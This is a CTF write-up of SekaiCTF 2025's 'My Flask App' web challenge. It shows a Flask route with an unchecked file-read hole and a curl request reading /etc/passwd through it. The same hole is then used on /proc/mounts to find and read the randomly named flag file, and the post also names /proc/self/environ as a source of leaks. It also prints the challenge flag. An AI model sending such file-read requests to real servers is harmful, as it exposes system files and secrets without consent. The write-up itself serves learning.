---
title: "SekaiCTF 2025 Writeup"
date: 2026-03-19T23:45:00+0800
tag: "SekaiCTF, Writeup, CTF"
lang: en-US
---

# Introduction

SekaiCTF 2025 is an international CTF competition organized by Project Sekai. This writeup covers the web exploitation challenges I solved during the competition. The challenges involved various web security concepts including Local File Inclusion (LFI), Docker container exploitation, and Linux filesystem analysis.

~~呢條友過左成件先寫返個 writeup 出黎~~

> Event Website: [SekaiCTF](https://sekai.team/)

## My Flask App

**Author**: belugagemink
**Difficulty**: 1/5
**Category**: Web Exploitation
**Description**: I created a Web application in Flask, what could be wrong?

### Challenge Overview

The Flask app has an LFI vulnerability in the `/view?filename=` endpoint, allowing us to read any file the app can access. The flag is in a file with a random 32-character name, making guessing difficult.

### Source Code Analysis

The vulnerable Flask app code:

```python
@app.route('/view')
def view():
    filename = request.args.get('filename')
    with open(filename, 'r') as file:
        content = file.read()
    return content, 200
```

We can see the `filename` parameter isn't checked, so we can read any file the app has access to.

Next, with **Dockerfile** Analysis:

```dockerfile
FROM python:3.11-slim

RUN pip install --no-cache-dir flask==3.1.1

WORKDIR /app

COPY app .

RUN mv flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1).txt && \
    chown -R nobody:nogroup /app

USER nobody

EXPOSE 5000

CMD ["python", "app.py"]
```

**We known**:
- The flag starts as `flag.txt` but is renamed to `/flag-[32-chars].txt` using a random 32-character string (`a-zA-Z0-9`) generated from `/dev/urandom`.
- The app runs as the `nobody` user, which may limit access to some files but not the flag or system files like `/proc/mounts`.
- The flag is placed at the root directory (`/`) and not inside `/app`, making it accessible via absolute paths.

### Steps to Solve

#### 1. Test LFI

Sent a request to `https://my-flask-app-au20ki2lzrqw.chals.sekai.team:1337/view?filename=/etc/passwd`. It returned the file's contents, confirming LFI.

```bash
curl "https://my-flask-app-au20ki2lzrqw.chals.sekai.team:1337/view?filename=/etc/passwd"
```

#### 2. Find Flag Location

The Dockerfile shows the flag is at `/flag-[32-chars].txt`. Tried `/view?filename=/`, but got `Error: Is a directory`. Guessing the random 32-character name was not practical.

#### 3. Check `/proc/mounts`

Since we can't list directories or guess the random filename, I checked the Linux `/proc/mounts` file which contains information about all mounted filesystems in the container.

Sent a request to:
```
https://my-flask-app-au20ki2lzrqw.chals.sekai.team:1337/view?filename=/proc/mounts
```

#### 4. Analyze Mount Information

The response showed the mount table:

```shell
overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/398/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/397/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/396/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/395/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/394/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/393/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/392/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/287/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1642/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1642/work,uuid=on 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime 0 0
/dev/nvme0n1p1 /flag-HxWgHNeExpE9kSG9NmAMjyn5RrpNMsKh.txt ext4 ro,relatime,commit=30 0 0
/dev/nvme0n1p1 /etc/hosts ext4 rw,relatime,commit=30 0 0
/dev/nvme0n1p1 /dev/termination-log ext4 rw,relatime,commit=30 0 0
/dev/nvme0n1p1 /etc/hostname ext4 rw,nosuid,nodev,relatime,commit=30 0 0
/dev/nvme0n1p1 /etc/resolv.conf ext4 rw,nosuid,nodev,relatime,commit=30 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
```

#### 5. Identify the Flag File

Looking carefully, we can see the flag file mount:

```
/dev/nvme0n1p1 /flag-HxWgHNeExpE9kSG9NmAMjyn5RrpNMsKh.txt ext4 ro,relatime,commit=30 0 0
```

This matched the `/flag-[32-chars].txt` pattern from the Dockerfile! The random filename is `HxWgHNeExpE9kSG9NmAMjyn5RrpNMsKh`.

#### 6. Get the Flag

Requested:
```
https://my-flask-app-au20ki2lzrqw.chals.sekai.team:1337/view?filename=/flag-HxWgHNeExpE9kSG9NmAMjyn5RrpNMsKh.txt
```

And we get the flag!

### Flag

```
SEKAI{!S-7H!s_3veN-call3d_a_cv3}
```

### Key Takeaways

1. **LFI Exploitation**: When you have unrestricted file read access, you can read any file the application has permission to access.

2. **Docker Container Information Leakage**: The `/proc` filesystem contains valuable information about the running container:
   - `/proc/mounts` - Shows all mounted filesystems
   - `/proc/self/environ` - Environment variables
   - `/proc/self/cmdline` - Command line used to start the process

3. **Linux Filesystem Knowledge**: Understanding how Linux exposes system information through `/proc` is crucial for container exploitation.

4. **Creative Problem Solving**: When you can't list directories or guess filenames, look for alternative information sources like mount tables, process information, or environment variables.
